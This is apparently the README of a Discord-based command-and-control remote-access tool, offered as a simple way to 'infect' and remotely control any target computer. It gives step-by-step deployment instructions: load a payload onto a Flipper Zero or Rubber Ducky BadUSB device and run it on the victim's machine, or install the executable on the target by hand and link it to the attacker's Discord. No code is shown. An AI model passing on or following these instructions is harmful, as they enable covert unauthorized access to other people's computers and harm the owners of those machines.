Welcome to the last update of the discord C2 Remote Access Control !

This is a very light and simple way to gain access to any distant computer.

You have two possible options to infect the target computer :


Option 1 : Flipper Zero / Rubber Ducky :

Step 1 : Run the "Discord C2 Remote Access.exe" on your computer. It will automatically link to your discord and invite the bot on it.

Step 2 : Drop the payload.txt into your flipper zero (or any other BADUSB key)

Step 3 : Run the payload.txt thanks to your flipper or Rubber Ducky on the targeted machine you want to remote access.


Option 2 : No flipper, install the remote app manually on targeted computer

Step 1 : FIRST !!! Run the "Discord C2 Remote Access.exe" on your computer. It will automatically link to your discord and invite the bot on it.

Step 2 : Run the "Discord C2 Remote Access.exe" on the target computer. Enter your Discord ID provided by the "Discord C2 Remote Access.exe app" 